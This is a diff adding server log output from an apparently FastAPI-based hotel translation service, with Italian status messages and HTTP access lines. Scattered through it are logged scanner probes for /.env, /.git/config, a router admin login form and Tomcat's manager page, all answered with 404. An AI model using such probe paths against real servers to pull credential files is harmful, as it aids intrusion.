+INFO:     154.81.156.35:39046 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     185.218.86.4:60400 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     185.218.84.178:40644 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.57:40850 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.57:57442 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.138.57:43478 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.57:60580 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     176.65.148.243:59310 - "POST /boaform/admin/formLogin HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     154.81.156.7:60202 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.196:34856 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.196:34870 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     206.168.34.196:37488 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.196:47706 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     118.42.76.38:61472 - "GET / HTTP/1.0" 200 OK
+INFO:     176.65.148.243:37876 - "POST /boaform/admin/formLogin HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     154.81.156.35:55936 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     139.59.63.7:60294 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     139.59.63.7:60296 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     185.218.86.4:33058 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     118.91.13.85:62354 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     34.76.105.151:50094 - "GET / HTTP/1.1" 200 OK
+INFO:     172.105.128.12:63994 - "GET / HTTP/1.1" 200 OK
+INFO:     185.242.226.154:44277 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     185.218.84.178:48756 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     154.81.156.35:58216 - "GET / HTTP/1.1" 200 OK
+INFO:     73.72.157.154:61577 - "GET / HTTP/1.0" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     211.196.28.162:62945 - "GET / HTTP/1.0" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     121.149.181.41:63282 - "GET / HTTP/1.0" 200 OK
+INFO:     185.218.86.4:35578 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     68.69.186.226:44772 - "POST /boaform/admin/formLogin HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     154.81.156.7:55746 - "GET / HTTP/1.1" 200 OK
+INFO:     74.235.140.14:50702 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     104.234.115.72:21489 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     104.234.115.72:42488 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     154.81.156.35:58486 - "GET / HTTP/1.1" 200 OK
+INFO:     5.90.118.37:55726 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     5.90.118.37:55719 - "GET /%3A HTTP/1.1" 404 Not Found
+INFO:     5.90.118.37:55719 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     5.90.118.37:55792 - "GET / HTTP/1.1" 200 OK
+INFO:     66.249.81.99:55527 - "GET / HTTP/1.1" 200 OK
+INFO:     66.102.9.192:57381 - "GET / HTTP/1.1" 200 OK
+INFO:     66.249.83.98:52777 - "GET / HTTP/1.1" 200 OK
+INFO:     5.90.118.37:55796 - "GET /doca HTTP/1.1" 404 Not Found
+INFO:     5.90.118.37:55796 - "GET /docs HTTP/1.1" 200 OK
+INFO:     5.90.118.37:55796 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     66.249.81.101:41901 - "GET /docs HTTP/1.1" 200 OK
+INFO:     66.249.81.99:34858 - "GET /docs HTTP/1.1" 200 OK
+INFO:     66.102.9.193:45358 - "GET /docs HTTP/1.1" 200 OK
+INFO:     66.102.9.193:45358 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     220.87.249.183:64000 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     104.234.115.72:38366 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     207.154.194.209:59536 - "GET / HTTP/1.1" 200 OK
+INFO:     207.154.194.209:59550 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     213.144.71.162:62215 - "GET /docs HTTP/1.1" 200 OK
+INFO:     213.144.71.162:62215 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     195.178.110.224:35564 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     20.55.73.223:59602 - "GET /actuator/health HTTP/1.1" 404 Not Found
+INFO:     185.218.84.178:47320 - "GET / HTTP/1.1" 200 OK
+INFO:     198.235.24.171:64646 - "GET / HTTP/1.1" 200 OK
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [250054]
+INFO:     Stopping reloader process [250052]
